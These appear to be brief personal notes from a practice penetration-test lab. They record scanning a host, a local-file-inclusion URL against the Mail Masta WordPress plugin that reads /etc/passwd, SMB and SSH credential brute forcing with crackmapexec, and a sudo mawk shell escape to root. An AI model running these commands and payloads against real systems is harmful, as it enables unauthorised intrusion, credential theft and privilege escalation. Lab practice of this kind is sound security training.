nmap -p- -sV -sC -Pn 192.168.102.112 --open

ftp anonymous available
passwords in pdf

wpscan for 
LFI in mail masta plugin
http://192.168.102.112/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
got username

crackmapexec smb 192.168.102.112 -u user112.txt -p password112.txt --shares --continue-on-success
 bruteforce ssh
 got sarah for ssh
 sudo -l 
 mawk
 sudo mawk 'BEGIN {system("/bin/sh")}'
 gtfobins got root